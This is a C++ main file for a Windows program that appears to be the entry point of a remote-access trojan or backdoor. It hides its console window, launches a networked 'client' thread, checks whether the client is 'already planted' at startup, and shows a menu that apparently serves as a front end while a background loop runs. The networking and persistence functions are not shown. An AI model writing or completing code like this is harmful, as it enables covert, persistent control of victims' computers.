#include <Windows.h>
#include <thread>

#include "gui\gui.h"
#include "client/client.h"

#pragma comment(lib, "wininet.lib")

int main() {
	/* Hide Console */
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	/* Create Client Thread */
	std::thread client(start_client);

	/* Check If Client Already Planted */
	if (!check_for_startup()) {
		/* Start Menu */
		menu_init();

		/* Run Menu Loop */
		menu_loop();
	}
	
	/* Run Background Loop */
	if (run_background)
		background_loop();

	return 0;
}